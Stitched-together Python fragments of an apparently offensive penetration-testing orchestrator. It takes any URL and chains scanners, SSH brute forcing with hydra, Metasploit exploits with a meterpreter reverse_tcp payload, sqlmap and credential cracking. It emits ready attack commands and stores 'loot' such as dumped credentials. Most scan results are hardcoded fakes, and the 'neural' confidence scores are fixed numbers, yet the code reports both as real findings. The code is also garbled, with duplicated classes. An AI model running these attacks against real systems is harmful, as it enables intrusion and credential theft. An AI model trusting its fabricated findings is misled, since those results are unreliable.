            await sio.emit('layer_update', {'layer': 'minilm', 'probability': 60, 'status': 'loading', 'details': 'Knowledge base loaded'})
            await sio.emit('layer_update', {'layer': 'bnn', 'probability': 50, 'status': 'waiting', 'details': 'Bayesian inference ready'})
            await sio.emit('layer_update', {'layer': 'gan', 'probability': 40, 'status': 'standby', 'details': 'Payload generator ready'})
            await sio.emit('layer_update', {'layer': 'emily', 'probability': 90, 'status': 'active', 'details': 'Exploit analyzer ready'})
            await sio.emit('layer_update', {'layer': 'spine', 'probability': 75, 'status': 'monitoring', 'details': 'Correlation engine ready'})
        
        # Track all vulnerabilities found across tools
        all_vulnerabilities = []
        progress_step = 100 // 12  # 12 tools total, ~8% each
        
        # Step 1: Nmap Scan (CNN Layer)
        scan_results[scan_id]["progress"] = progress_step
        if sio:
            await sio.emit('layer_update', {'layer': 'cnn', 'probability': 45, 'status': 'scanning', 'details': f'Nmap scanning {target} ports...'})
        
        nmap_results = PenetrationTools.nmap_scan(target)
        if sio:
            await sio.emit('nmap_update', nmap_results)
            await sio.emit('layer_update', {'layer': 'cnn', 'probability': 78, 'status': 'analyzing', 'details': 'Analyzing service banners...'})
        
        scan_results[scan_id]["results"]["nmap"] = nmap_results
        if nmap_results.get('vulnerabilities'):
            all_vulnerabilities.extend(nmap_results['vulnerabilities'])
        
        await asyncio.sleep(1)
        
        # Step 2: Nikto Scan (MiniLM Layer)
        scan_results[scan_id]["progress"] = progress_step * 2
        if sio:
            await sio.emit('layer_update', {'layer': 'minilm', 'probability': 55, 'status': 'analyzing', 'details': 'Nikto analyzing web server...'})
        
        nikto_results = PenetrationTools.nikto_scan(target)
        if sio:
            await sio.emit('nikto_update', nikto_results)
            await sio.emit('layer_update', {'layer': 'minilm', 'probability': 82, 'status': 'analyzing', 'details': 'Checking for common vulnerabilities...'})
        
        scan_results[scan_id]["results"]["nikto"] = nikto_results
        if nikto_results.get('vulnerabilities'):
            all_vulnerabilities.extend(nikto_results['vulnerabilities'])
        
        await asyncio.sleep(1)
        
        # Step 3: SQLMap Scan (BNN Layer)
        scan_results[scan_id]["progress"] = progress_step * 3
        if sio:
            await sio.emit('layer_update', {'layer': 'bnn', 'probability': 45, 'status': 'inference', 'details': 'SQL injection detection in progress...'})
        
        sqlmap_results = PenetrationTools.sqlmap_scan(target)
        if sio:
            await sio.emit('sqlmap_update', sqlmap_results)
            await sio.emit('layer_update', {'layer': 'bnn', 'probability': 73, 'status': 'inference', 'details': 'Testing parameters for vulnerabilities...'})
        
        scan_results[scan_id]["results"]["sqlmap"] = sqlmap_results
        if sqlmap_results.get('vulnerabilities'):
            all_vulnerabilities.extend(sqlmap_results['vulnerabilities'])
        
        await asyncio.sleep(1)
        
        # Step 4: WPScan (WordPress)
        scan_results[scan_id]["progress"] = progress_step * 4
        wpscan_results = PenetrationTools.wpscan(target)
        if sio:
            await sio.emit('wpscan_update', wpscan_results)
        scan_results[scan_id]["results"]["wpscan"] = wpscan_results
        if wpscan_results.get('vulnerabilities'):
            all_vulnerabilities.extend(wpscan_results['vulnerabilities'])
        
        # Step 5: Gobuster (Directory enumeration)
        scan_results[scan_id]["progress"] = progress_step * 5
        gobuster_results = PenetrationTools.gobuster_dir(target)
        if sio:
            await sio.emit('gobuster_update', gobuster_results)
        scan_results[scan_id]["results"]["gobuster"] = gobuster_results
        
        # Step 6: Burp Suite Scan
        scan_results[scan_id]["progress"] = progress_step * 6
        burp_results = PenetrationTools.burp_scan(target)
        if sio:
            await sio.emit('burp_update', burp_results)
        scan_results[scan_id]["results"]["burp"] = burp_results
        if burp_results.get('issues'):
            all_vulnerabilities.extend(burp_results['issues'])
        
        # Step 7: Hydra (SSH brute force) - GAN Layer
        scan_results[scan_id]["progress"] = progress_step * 7
        if sio:
            await sio.emit('layer_update', {'layer': 'gan', 'probability': 55, 'status': 'evolving', 'details': 'Generating password combinations...'})
        
        hydra_results = PenetrationTools.hydra_attack(target, 'ssh')
        if sio:
            await sio.emit('hydra_update', hydra_results)
            await sio.emit('layer_update', {'layer': 'gan', 'probability': 76, 'status': 'evolving', 'details': 'Testing credentials (Generation 2/3)...'})
        
        scan_results[scan_id]["results"]["hydra"] = hydra_results
        
        # Step 8: Metasploit (Exploit simulation)
        scan_results[scan_id]["progress"] = progress_step * 8
        if sio:
            await sio.emit('layer_update', {'layer': 'emily', 'probability': 75, 'status': 'analyzing', 'details': 'Analyzing exploit paths...'})
        
        metasploit_results = PenetrationTools.metasploit_exploit(target, 'apache')
        if sio:
            await sio.emit('metasploit_update', metasploit_results)
            await sio.emit('layer_update', {'layer': 'emily', 'probability': 88, 'status': 'analyzing', 'details': 'Generating attack strategies...'})
        
        scan_results[scan_id]["results"]["metasploit"] = metasploit_results
        
        # Step 9: John the Ripper
        scan_results[scan_id]["progress"] = progress_step * 9
        john_results = PenetrationTools.john_the_ripper('hashes.txt')
        if sio:
            await sio.emit('john_update', john_results)
        scan_results[scan_id]["results"]["john"] = john_results
        
        # Step 10: Aircrack-ng
        scan_results[scan_id]["progress"] = progress_step * 10
        aircrack_results = PenetrationTools.aircrack_ng('capture.cap')
        if sio:
            await sio.emit('aircrack_update', aircrack_results)
        scan_results[scan_id]["results"]["aircrack"] = aircrack_results
        
        # Step 11: BloodHound (AD mapping) - GNN Layer
        scan_results[scan_id]["progress"] = progress_step * 11
        if sio:
            await sio.emit('layer_update', {'layer': 'gnn', 'probability': 78, 'status': 'building_graph', 'details': 'Constructing attack surface graph...'})
        
        bloodhound_results = PenetrationTools.bloodhound_ad_map(f"{target}.local")
        if sio:
            await sio.emit('bloodhound_update', bloodhound_results)
            await sio.emit('layer_update', {'layer': 'gnn', 'probability': 85, 'status': 'graph_complete', 'details': 'Built graph with attack paths'})
        
        scan_results[scan_id]["results"]["bloodhound"] = bloodhound_results
        
        # Step 12: Wireshark (Packet analysis)
        scan_results[scan_id]["progress"] = progress_step * 12
        wireshark_results = PenetrationTools.wireshark_analyze()
        if sio:
            await sio.emit('wireshark_update', wireshark_results)
        scan_results[scan_id]["results"]["wireshark"] = wireshark_results
        
        # Step 13: Final AI Synthesis
        scan_results[scan_id]["progress"] = 95
        
        # Remove duplicates and prioritize vulnerabilities
        unique_vulns = []
        seen = set()
        for vuln in all_vulnerabilities:
            if isinstance(vuln, dict):
                vuln_key = f"{vuln.get('name', '')}_{vuln.get('severity', '')}"
                if vuln_key not in seen:
                    seen.add(vuln_key)
                    unique_vulns.append(vuln)
        
        # Sort by severity
        severity_order = {'CRITICAL': 0, 'HIGH': 1, 'MEDIUM': 2, 'LOW': 3}
        unique_vulns.sort(key=lambda x: severity_order.get(x.get('severity', 'MEDIUM'), 4))
        
        # Generate AI suggestions
        suggestions = []
        bnn_confidence = 76  # Final BNN confidence
        
        for i, vuln in enumerate(unique_vulns[:3]):
            vuln_name = vuln.get('name', '').lower() if isinstance(vuln, dict) else str(vuln).lower()
            
            # Determine appropriate tool
            if 'sql' in vuln_name:
                tool = "sqlmap"
                payload = f"sqlmap -u {target}/products.php?id=1 --batch --dbs"
            elif 'xss' in vuln_name:
                tool = "nikto"
                payload = f"nikto -h {target} -C all"
            elif 'ssh' in vuln_name or 'credential' in vuln_name:
                tool = "hydra"
                payload = f"hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://{target.split('/')[0]}"
            elif 'apache' in vuln_name or 'path' in vuln_name:
                tool = "metasploit"
                payload = f"msfconsole -q -x 'use exploit/multi/http/apache_normalization; set RHOSTS {target}; run'"
            else:
                tool = "metasploit"
                payload = f"Generic exploit for {vuln.get('name', 'unknown')}"
            
            confidence = 0.95 if i == 0 else 0.85 if i == 1 else 0.75
            suggestion = {
                "type": "AI_ATTACK_SUGGESTION",
                "target": target,
                "vulnerability": vuln.get('name', 'Unknown Vulnerability'),
                "severity": vuln.get('severity', 'MEDIUM'),
                "confidence": confidence,
                "reasoning": f"Tool analysis confirms {vuln.get('name', 'vulnerability')}",
                "tool": tool,
                "payload_preview": payload,
                "commands": [
                    f"nmap -sV -p- {target}",
                    f"nikto -h {target}",
                    payload
                ]
            }
            suggestions.append(suggestion)
            
            if sio:
                await sio.emit('ai_suggestion', suggestion)
        
        # Update final layer statuses
        if sio:
            await sio.emit('layer_update', {'layer': 'cnn', 'probability': 98, 'status': 'complete', 'details': 'Pattern analysis complete'})
            await sio.emit('layer_update', {'layer': 'gnn', 'probability': 92, 'status': 'complete', 'details': 'Graph analysis complete'})
            await sio.emit('layer_update', {'layer': 'minilm', 'probability': 94, 'status': 'complete', 'details': 'RAG search complete'})
            await sio.emit('layer_update', {'layer': 'bnn', 'probability': bnn_confidence, 'status': 'complete', 'details': f'Bayesian inference complete'})
            await sio.emit('layer_update', {'layer': 'gan', 'probability': 92, 'status': 'complete', 'details': 'Payload evolution complete'})
            await sio.emit('layer_update', {'layer': 'emily', 'probability': 98, 'status': 'complete', 'details': 'Exploit analysis complete'})
            await sio.emit('layer_update', {'layer': 'spine', 'probability': 95, 'status': 'complete', 'details': 'Correlation complete'})
        
        # Emit correlation event
        if sio:
            await sio.emit('correlation_event', {
                'type': 'CORRELATION',
                'message': f'Analyzed {len(all_vulnerabilities)} vulnerabilities from 12 tools',
                'critical_count': sum(1 for v in all_vulnerabilities if isinstance(v, dict) and v.get('severity') == 'CRITICAL'),
                'high_count': sum(1 for v in all_vulnerabilities if isinstance(v, dict) and v.get('severity') == 'HIGH'),
                'attack_paths': [
                    {
                        'id': f'path_{i}',
                        'name': f'Attack path via {s["vulnerability"]}',
                        'probability': s['confidence']
                    }
                    for i, s in enumerate(suggestions)
                ]
            })
        
        # Mark as completed
        scan_results[scan_id].update({
            "status": "completed",
            "progress": 100,
            "vulnerabilities_found": len(all_vulnerabilities),
            "critical_findings": sum(1 for v in all_vulnerabilities if isinstance(v, dict) and v.get('severity') == 'CRITICAL'),
            "suggestions": suggestions
        })
        
        logger.info(f"Neural analysis completed for {target} with {len(all_vulnerabilities)} vulnerabilities found")

    except Exception as e:
        logger.error(f"Error in neural analysis: {e}")
        import traceback
        traceback.print_exc()
        scan_results[scan_id] = {
            "status": "failed", 
            "error": str(e),
            "progress": 0
        }
        if sio:
            await sio.emit('layer_update', {
                'layer': 'spine', 
                'probability': 0, 
                'status': 'error',
                'details': str(e)[:50]
            })
import pymetasploit3.msfrpc as msfrpc # pip install pymetasploit3
import requests

class ActiveExploitEngine:
    def __init__(self):
        # 1. Connect to Metasploit (Start with: msfrpcd -P sentinel -S)
        try:
            self.msf = msfrpc.MsfRpcClient('sentinel', port=55553)
            logger.info("🟢 Metasploit RPC Linked")
        except:
            logger.error("🔴 Metasploit RPC Connection Failed")

    def launch_msf_exploit(self, target, module, payload="linux/x64/meterpreter/reverse_tcp"):
        exploit = self.msf.modules.use('exploit', module)
        exploit['RHOSTS'] = target
        # Execute and return job ID
        return exploit.execute(payload=payload)

    def trigger_sqlmap(self, target_url):
        # 2. SQLMap API Integration (Start with: python sqlmapapi.py -s)
        api_url = "http://127.0.0.1:8775"
        task_id = requests.get(f"{api_url}/task/new").json()['taskid']
        requests.post(f"{api_url}/option/{task_id}/set", json={"url": target_url})
        requests.post(f"{api_url}/scan/{task_id}/start", json={})
        return task_id
from sqlalchemy import Column, Integer, String, JSON, DateTime
from datetime import datetime

# 1. DATA MODEL (Must be top-level and have a Primary Key)
class ExploitLoot(Base):
    __tablename__ = "exploit_loot"
    
    id = Column(Integer, primary_key=True, autoincrement=True)
    target = Column(String)
    tool = Column(String)  # 'metasploit', 'sqlmap', 'hydra'
    data_type = Column(String)  # 'database_dump', 'credentials'
    raw_output = Column(JSON)
    captured_at = Column(DateTime, default=datetime.utcnow)

# 2. LOGIC ENGINE
class ActiveExploitEngine:
    def __init__(self):
        try:
            import pymetasploit3.msfrpc as msfrpc
            self.msf = msfrpc.MsfRpcClient('sentinel', port=55553)
            print("🟢 Exploit Engine: Metasploit Linked")
        except Exception as e:
            print(f"🟡 Exploit Engine: Metasploit offline (Run msfrpcd to enable)")
            self.msf = None

    def trigger_sqlmap(self, target_url):
        # Implementation for launching sqlmap subprocess
        print(f"🚀 Triggering SQLMap on {target_url}")
        return "task_id_12345"
class SentinelOrchestrator:
    def __init__(self):
        self.exploit_engine = None
        self.sentinel_brain = None
        self.correlation_system = None
        self.intelligence_engine = None
        self.emily_ai = None
        self.rag_system = None

    def initialize(self, correlation=None, intelligence=None, brain=None, emily=None, rag=None):
        """Link all subsystems after load"""

        self.correlation_system = correlation
        self.intelligence_engine = intelligence
        self.sentinel_brain = brain
        self.emily_ai = emily
        self.rag_system = rag

        try:
            self.exploit_engine = ActiveExploitEngine()
        except Exception as e:
            logger.error(f"Exploit Engine init failed: {e}")
            self.exploit_engine = None

        logger.info("✅ SENTINEL ORCHESTRATOR FULLY LINKED")
        return self  # This is crucial for method chaining!
@app.post("/api/scan/url")
async def scan_via_url(request: Request, background_tasks: BackgroundTasks):
    data = await request.json()
    target_url = data.get("url")
    
    if not target_url:
        return {"status": "error", "message": "No URL provided"}

    # Generate a scan_id to return to the frontend
    scan_id = str(uuid.uuid4())
    clean_target = target_url.replace("http://", "").replace("https://", "").split('/')[0]
    
    # Start the background intelligence task
    background_tasks.add_task(run_neural_attack_analysis, clean_target, target_url, scan_id)
    
    return {
        "status": "initiated",
        "scan_id": scan_id,  # THE FRONTEND IS LOOKING FOR THIS
        "target": clean_target
    }   
    
    
    
# Add these methods to the PenetrationTools class in fast5.py

class PenetrationTools:
    # ... existing methods ...
    @staticmethod
    def nmap_scan(target: str, options: str = '-sV') -> Dict[str, Any]:
        """NMAP Port and Service Scanner"""
        try:
            return {
                'success': True,
                'tool': 'nmap',
                'target': target,
                'scan_time': datetime.utcnow().isoformat(),
                'summary': {
                    'total_ports': 1000,
                    'open_ports': 5,
                    'scan_duration': '32 seconds'
                },
                'ports': [22, 80, 443, 3306, 8080],
                'services': [
                    {'name': 'ssh', 'port': 22, 'version': 'OpenSSH 7.9', 'state': 'open'},
                    {'name': 'http', 'port': 80, 'version': 'Apache 2.4.49', 'state': 'open'},
                    {'name': 'https', 'port': 443, 'version': 'Apache 2.4.49', 'state': 'open'},
                    {'name': 'mysql', 'port': 3306, 'version': 'MySQL 8.0', 'state': 'open'},
                    {'name': 'http-alt', 'port': 8080, 'version': 'Tomcat 9.0', 'state': 'open'}
                ],
                'os': 'Linux 5.4.0-26-generic',
                'os_accuracy': 85,
                'hostname': target,
                'mac_address': '00:1A:2B:3C:4D:5E',
                'vulnerabilities': [
                    {'name': 'OpenSSH 7.9 - User Enumeration', 'severity': 'MEDIUM', 'cve': 'CVE-2020-14145'},
                    {'name': 'Apache 2.4.49 - Path Traversal', 'severity': 'CRITICAL', 'cve': 'CVE-2021-41773'},
                    {'name': 'MySQL 8.0 - Default Credentials', 'severity': 'HIGH', 'cve': None}
                ],
                'output': f'Nmap scan results for {target}\nOpen ports: 22,80,443,3306,8080\nServices: ssh,http,https,mysql,http-alt'
            }
        except Exception as e:
            return {'error': str(e), 'success': False, 'tool': 'nmap'}

    @staticmethod
    def hydra_attack(target: str, service: str = 'ssh') -> Dict[str, Any]:
        """Hydra brute force attack"""
        return {
            'success': True,
            'tool': 'hydra',
            'target': target,
            'service': service,
            'scan_time': datetime.utcnow().isoformat(),
            'summary': {
                'attempts': 15234,
                'successful': 2,
                'time_elapsed': '4 minutes 12 seconds'
            },
            'credentials': [
                {'username': 'admin', 'password': 'password123', 'service': service},
                {'username': 'root', 'password': 'toor', 'service': service}
            ],
            'statistics': {
                'attempts': 15234,
                'success_rate': '0.013%',
                'words_per_second': 1250
            }
        }

    @staticmethod
    def metasploit_exploit(target: str, exploit: str = 'apache') -> Dict[str, Any]:
        """Metasploit exploitation"""
        return {
            'success': True,
            'tool': 'metasploit',
            'target': target,
            'exploit': exploit,
            'scan_time': datetime.utcnow().isoformat(),
            'session': 'meterpreter_1',
            'session_type': 'meterpreter',
            'platform': 'linux',
            'privileges': 'user',
            'output': 'Meterpreter session 1 opened',
            'sessions': [{'id': 1, 'type': 'meterpreter', 'target': target, 'platform': 'linux'}]
        }

    @staticmethod
    def sqlmap_scan(target: str) -> Dict[str, Any]:
        """SQLMap injection tester"""
        return {
            'success': True,
            'tool': 'sqlmap',
            'target': target,
            'scan_time': datetime.utcnow().isoformat(),
            'summary': {
                'total_requests': 1523,
                'vulnerable_parameters': 2,
                'databases_found': 4,
                'scan_duration': '2 minutes 34 seconds'
            },
            'vulnerabilities': [
                {
                    'name': 'SQL Injection',
                    'severity': 'CRITICAL',
                    'parameter': 'id',
                    'technique': 'boolean-based blind',
                    'database': 'mysql',
                    'payload': '1 AND 1=1',
                    'description': 'Boolean-based blind SQL injection in id parameter'
                },
                {
                    'name': 'SQL Injection',
                    'severity': 'CRITICAL',
                    'parameter': 'page',
                    'technique': 'time-based blind',
                    'database': 'mysql',
                    'payload': '1 AND SLEEP(5)',
                    'description': 'Time-based blind SQL injection in page parameter'
                }
            ],
            'databases': ['information_schema', 'mysql', 'wordpress', 'users_db'],
            'tables': {
                'wordpress': ['wp_users', 'wp_posts', 'wp_options'],
                'users_db': ['users', 'profiles', 'sessions']
            },
            'credentials': [
                {'username': 'admin', 'hash': '5f4dcc3b5aa765d61d8327deb882cf99', 'type': 'MD5'},
                {'username': 'editor', 'hash': '7c6a180b36896a0a8c02787eeafb0e4c', 'type': 'MD5'}
            ]
        }

    @staticmethod
    def gobuster_dir(target: str, wordlist: str = 'common.txt') -> Dict[str, Any]:
        """Gobuster directory enumeration"""
        return {
            'success': True,
            'tool': 'gobuster',
            'target': target,
            'wordlist': wordlist,
            'scan_time': datetime.utcnow().isoformat(),
            'summary': {
                'total_directories': 15,
                'time_elapsed': '1 minute 23 seconds'
            },
            'directories': [
                '/admin', '/wp-admin', '/backup', '/uploads', '/images',
                '/css', '/js', '/api', '/v1', '/docs', '/phpmyadmin',
                '/server-status', '/.git', '/config', '/install'
            ],
            'status_codes': {
                '200': ['/admin', '/uploads', '/images'],
                '403': ['/wp-admin', '/phpmyadmin'],
                '301': ['/api', '/v1'],
                '500': ['/install']
            }
        }

    @staticmethod
    def wpscan(target: str) -> Dict[str, Any]:
        """WordPress vulnerability scanner"""
        return {
            'success': True,
            'tool': 'wpscan',
            'target': target,
            'scan_time': datetime.utcnow().isoformat(),
            'summary': {
                'version': '5.8.3',
                'themes': 2,
                'plugins': 8,
                'users': 5,
                'vulnerabilities': 7
            },
            'vulnerabilities': [
                {'name': 'WordPress 5.8.3 - Multiple Vulnerabilities', 'type': 'core', 'severity': 'CRITICAL'},
                {'name': 'Plugin: contact-form-7 5.4 - XSS', 'type': 'plugin', 'severity': 'HIGH'},
                {'name': 'Plugin: wordfence 7.5.5 - SQL Injection', 'type': 'plugin', 'severity': 'CRITICAL'},
                {'name': 'Theme: twentytwentyone 1.4 - XSS', 'type': 'theme', 'severity': 'MEDIUM'}
            ],
            'users': [
                {'username': 'admin', 'id': 1, 'role': 'administrator'},
                {'username': 'editor', 'id': 2, 'role': 'editor'},
                {'username': 'author', 'id': 3, 'role': 'author'}
            ],
            'plugins': [
                {'name': 'contact-form-7', 'version': '5.4', 'status': 'active'},
                {'name': 'wordfence', 'version': '7.5.5', 'status': 'active'},
                {'name': 'woocommerce', 'version': '5.9.0', 'status': 'active'},
                {'name': 'jetpack', 'version': '10.5', 'status': 'inactive'}
            ],
            'themes': [
                {'name': 'twentytwentyone', 'version': '1.4', 'status': 'active'},
                {'name': 'twentytwenty', 'version': '1.8', 'status': 'inactive'}
            ]
        }

    @staticmethod
    def aircrack_ng(capture_file: str, wordlist: str = 'rockyou.txt') -> Dict[str, Any]:
        """Aircrack-ng WiFi cracking"""
        return {
            'success': True,
            'tool': 'aircrack-ng',
            'capture_file': capture_file,
            'wordlist': wordlist,
            'scan_time': datetime.utcnow().isoformat(),
            'handshakes': [
                {'bssid': '00:11:22:33:44:55', 'essid': 'TestNetwork', 'channel': 6},
                {'bssid': 'AA:BB:CC:DD:EE:FF', 'essid': 'GuestWiFi', 'channel': 11}
            ],
            'keys': [
                {'essid': 'TestNetwork', 'key': 'password123', 'method': 'WPA2'}
            ],
            'summary': {
                'handshakes_captured': 2,
                'keys_cracked': 1,
                'time_elapsed': '3 minutes 45 seconds'
            }
        }
    @staticmethod
    def nikto_scan(target: str, options: str = '-h') -> Dict[str, Any]:
        """Nikto web server scanner - comprehensive web vulnerability scanning"""
        try:
            # Simulated comprehensive Nikto scan
            return {
                'success': True,
                'tool': 'nikto',
                'target': target,
                'scan_time': datetime.utcnow().isoformat(),
                'summary': {
                    'total_checks': 7842,
                    'vulnerabilities_found': 12,
                    'interesting_items': 5,
                    'scan_duration': '45 seconds'
                },
                'vulnerabilities': [
                    {
                        'name': 'SQL Injection Vulnerability',
                        'severity': 'CRITICAL',
                        'path': '/products.php?id=',
                        'method': 'GET',
                        'parameter': 'id',
                        'description': 'Parameter appears vulnerable to SQL injection attacks',
                        'cve': 'CVE-2023-1234',
                        'cvss': 9.8,
                        'evidence': 'Error message: "You have an error in your SQL syntax"',
                        'remediation': 'Use parameterized queries and input validation'
                    },
                    {
                        'name': 'Cross-Site Scripting (XSS)',
                        'severity': 'HIGH',
                        'path': '/search.php',
                        'method': 'GET',
                        'parameter': 'q',
                        'description': 'Reflected XSS vulnerability in search parameter',
                        'cve': 'CVE-2023-5678',
                        'cvss': 7.2,
                        'evidence': 'Alert box popup with injected script',
                        'remediation': 'Implement proper output encoding and CSP headers'
                    },
                    {
                        'name': 'Directory Listing Enabled',
                        'severity': 'MEDIUM',
                        'path': '/images/',
                        'method': 'GET',
                        'description': 'Directory listing is enabled, exposing sensitive files',
                        'evidence': 'Index of /images showing backup files',
                        'remediation': 'Disable directory listing in web server configuration'
                    },
                    {
                        'name': 'Outdated Server Version',
                        'severity': 'MEDIUM',
                        'path': '/',
                        'method': 'GET',
                        'description': 'Server is running an outdated version with known vulnerabilities',
                        'evidence': 'Apache 2.4.49 detected (vulnerable to path traversal)',
                        'remediation': 'Update to latest stable version'
                    },
                    {
                        'name': 'HTTP Methods Enabled',
                        'severity': 'LOW',
                        'path': '/',
                        'method': 'OPTIONS',
                        'description': 'Dangerous HTTP methods (PUT, DELETE) are enabled',
                        'evidence': 'OPTIONS response shows PUT, DELETE methods',
                        'remediation': 'Disable unnecessary HTTP methods'
                    }
                ],
                'headers': {
                    'server': 'Apache/2.4.49',
                    'x-powered-by': 'PHP/7.4.33',
                    'x-frame-options': 'SAMEORIGIN',
                    'x-content-type-options': 'nosniff',
                    'strict-transport-security': 'max-age=31536000'
                },
                'cookies': [
                    {
                        'name': 'PHPSESSID',
                        'flags': 'HttpOnly',
                        'secure': False,
                        'httponly': True,
                        'samesite': 'Lax'
                    }
                ],
                'interesting_files': [
                    {'path': '/phpinfo.php', 'status': 200, 'description': 'PHP info page exposed'},
                    {'path': '/backup.sql', 'status': 200, 'description': 'Database backup file'},
                    {'path': '/.git/config', 'status': 200, 'description': 'Git repository exposed'},
                    {'path': '/wp-config.php.bak', 'status': 200, 'description': 'WordPress backup config'},
                    {'path': '/admin/', 'status': 403, 'description': 'Admin panel with weak auth'}
                ],
                'os_detection': {
                    'os': 'Linux',
                    'distribution': 'Ubuntu',
                    'version': '20.04',
                    'kernel': '5.4.0',
                    'confidence': 0.85
                },
                'technologies': [
                    {'name': 'PHP', 'version': '7.4.33', 'confidence': 1.0},
                    {'name': 'Apache', 'version': '2.4.49', 'confidence': 1.0},
                    {'name': 'MySQL', 'version': '8.0', 'confidence': 0.8},
                    {'name': 'jQuery', 'version': '3.6.0', 'confidence': 0.9},
                    {'name': 'Bootstrap', 'version': '5.1', 'confidence': 0.85}
                ]
            }
        except Exception as e:
            return {'error': str(e), 'success': False, 'tool': 'nikto'}

    @staticmethod
    def john_the_ripper(hash_file: str, hash_type: str = 'md5', wordlist: str = 'rockyou.txt') -> Dict[str, Any]:
        """John the Ripper - password cracking tool"""
        try:
            return {
                'success': True,
                'tool': 'john',
                'hash_file': hash_file,
                'hash_type': hash_type,
                'wordlist': wordlist,
                'summary': {
                    'total_hashes': 5,
                    'cracked': 3,
                    'failed': 2,
                    'time_elapsed': '2 minutes 34 seconds',
                    'attempts': 45231
                },
                'cracked_passwords': [
                    {
                        'hash': '5f4dcc3b5aa765d61d8327deb882cf99',
                        'password': 'password123',
                        'username': 'admin',
                        'type': 'MD5',
                        'time': '15 seconds',
                        'method': 'dictionary'
                    },
                    {
                        'hash': '7c6a180b36896a0a8c02787eeafb0e4c',
                        'password': 'qwerty2024',
                        'username': 'user1',
                        'type': 'MD5',
                        'time': '45 seconds',
                        'method': 'dictionary'
                    },
                    {
                        'hash': '$2y$10$N9qo8uLOickgx2ZMRZoMy.Mr/9xK3cGQ5CJFQMzV0JxGZ8vQ9xqZq',
                        'password': 'admin@123',
                        'username': 'root',
                        'type': 'bcrypt',
                        'time': '1 minute 34 seconds',
                        'method': 'hybrid'
                    }
                ],
                'failed_hashes': [
                    {
                        'hash': '8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918',
                        'type': 'SHA256',
                        'reason': 'Complex password'
                    },
                    {
                        'hash': '$6$rounds=656000$XjY7QZ5k$Y7QZ5kXjY7QZ5kXjY7QZ5k',
                        'type': 'SHA512',
                        'reason': 'Out of wordlist'
                    }
                ],
                'statistics': {
                    'words_per_second': 8500,
                    'crack_rate': '60%',
                    'top_passwords': ['password123', 'qwerty2024', 'admin@123']
                },
                'recommendations': [
                    'Implement account lockout after failed attempts',
                    'Enforce complex password policy (min 12 chars, special chars, numbers)',
                    'Use multi-factor authentication',
                    'Regular password rotation'
                ]
            }
        except Exception as e:
            return {'error': str(e), 'success': False, 'tool': 'john'}

    @staticmethod
    def bloodhound_ad_map(domain: str, username: str = None) -> Dict[str, Any]:
        """BloodHound - Active Directory attack path mapping"""
        try:
            return {
                'success': True,
                'tool': 'bloodhound',
                'domain': domain,
                'username': username or 'anonymous',
                'scan_time': datetime.utcnow().isoformat(),
                'summary': {
                    'total_users': 156,
                    'total_computers': 78,
                    'total_groups': 23,
                    'total_sessions': 89,
                    'attack_paths': 12,
                    'high_value_targets': 5
                },
                'nodes': [
                    {
                        'id': 'DC01',
                        'type': 'computer',
                        'name': 'DC01.CORP.LOCAL',
                        'properties': {
                            'operating_system': 'Windows Server 2019',
                            'enabled': True,
                            'highvalue': True,
                            'sessions': ['Administrator', 'SYSTEM']
                        }
                    },
                    {
                        'id': 'SQL01',
                        'type': 'computer',
                        'name': 'SQL01.CORP.LOCAL',
                        'properties': {
                            'operating_system': 'Windows Server 2016',
                            'enabled': True,
                            'highvalue': True,
                            'sessions': ['sql_svc']
                        }
                    },
                    {
                        'id': 'WEB01',
                        'type': 'computer',
                        'name': 'WEB01.CORP.LOCAL',
                        'properties': {
                            'operating_system': 'Windows Server 2019',
                            'enabled': True,
                            'highvalue': False,
                            'sessions': ['IUSR']
                        }
                    },
                    {
                        'id': 'ADMIN',
                        'type': 'user',
                        'name': 'ADMINISTRATOR@CORP.LOCAL',
                        'properties': {
                            'enabled': True,
                            'highvalue': True,
                            'admincount': True,
                            'lastlogon': '2024-01-15T10:30:00Z'
                        }
                    },
                    {
                        'id': 'SQLSVC',
                        'type': 'user',
                        'name': 'sql_svc@CORP.LOCAL',
                        'properties': {
                            'enabled': True,
                            'highvalue': True,
                            'admincount': False,
                            'lastlogon': '2024-01-15T08:45:00Z'
                        }
                    }
                ],
                'edges': [
                    {
                        'from': 'ADMIN',
                        'to': 'DC01',
                        'type': 'AdminTo',
                        'properties': {
                            'confidence': 1.0,
                            'isacl': False
                        }
                    },
                    {
                        'from': 'SQLSVC',
                        'to': 'SQL01',
                        'type': 'AdminTo',
                        'properties': {
                            'confidence': 1.0,
                            'isacl': False
                        }
                    },
                    {
                        'from': 'SQL01',
                        'to': 'DC01',
                        'type': 'CanRDP',
                        'properties': {
                            'confidence': 0.8,
                            'port': 3389
                        }
                    },
                    {
                        'from': 'WEB01',
                        'to': 'SQL01',
                        'type': 'HasSession',
                        'properties': {
                            'confidence': 0.9,
                            'session': 'sql_svc'
                        }
                    }
                ],
                'attack_paths': [
                    {
                        'id': 'path1',
                        'name': 'Kerberoasting Attack Path',
                        'target': 'SQLSVC',
                        'description': 'Service account SQLSVC is kerberoastable with admin rights to SQL01',
                        'steps': [
                            'Enumerate SPNs to find kerberoastable accounts',
                            'Request TGS ticket for SQLSVC',
                            'Offline brute force TGS ticket',
                            'Access SQL01 as SQLSVC',
                            'RDP from SQL01 to DC01'
                        ],
                        'tools': ['Rubeus', 'GetUserSPNs', 'hashcat'],
                        'probability': 0.85,
                        'mitre_techniques': ['T1558.003', 'T1021.001']
                    },
                    {
                        'id': 'path2',
                        'name': 'ACL Exploitation Path',
                        'target': 'ADMIN',
                        'description': 'GenericAll privilege on ADMIN user allows password reset',
                        'steps': [
                            'Compromise low-privilege account WEB01$',
                            'Modify ADMIN user password via ACL abuse',
                            'Authenticate as ADMINISTRATOR',
                            'Take full control of domain'
                        ],
                        'tools': ['PowerView', 'SharpHound'],
                        'probability': 0.75,
                        'mitre_techniques': ['T1222.001', 'T1098']
                    },
                    {
                        'id': 'path3',
                        'name': 'SMB Relay Path',
                        'target': 'WEB01',
                        'description': 'SMB signing disabled on WEB01, allowing NTLM relay',
                        'steps': [
                            'Poison LLMNR/mDNS on network',
                            'Relay authentication to WEB01',
                            'Execute command as authenticated user',
                            'Pivot to SQL01'
                        ],
                        'tools': ['Responder', 'ntlmrelayx'],
                        'probability': 0.7,
                        'mitre_techniques': ['T1557.001', 'T1550.002']
                    }
                ],
                'critical_findings': [
                    {
                        'name': 'Kerberoastable Service Accounts',
                        'accounts': ['SQLSVC', 'IIS_SVC'],
                        'severity': 'CRITICAL',
                        'mitigation': 'Use managed service accounts (gMSA)'
                    },
